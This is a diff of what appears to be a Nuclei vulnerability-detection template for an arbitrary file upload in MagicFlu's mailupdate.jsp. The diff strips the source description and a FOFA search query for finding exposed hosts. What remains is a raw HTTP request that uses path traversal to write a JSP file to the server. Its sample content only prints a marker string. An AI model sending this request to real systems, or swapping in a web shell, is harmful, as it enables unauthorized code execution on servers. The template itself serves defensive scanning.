@@ -3,12 +3,8 @@ info:
   name: 魔方网表 mailupdate.jsp 接口 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hqvzl2qf0icfpe7z'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hqvzl2qf0icfpe7z
-    fofa: body="/magicflu/html/login/img/leftbottom.png"
 http:
 - raw:
   - 'GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../dudesite.jsp&messagecontent=%3C%25+out.println%28%22dudesite%22%29%3B%25%3E HTTP/1.1
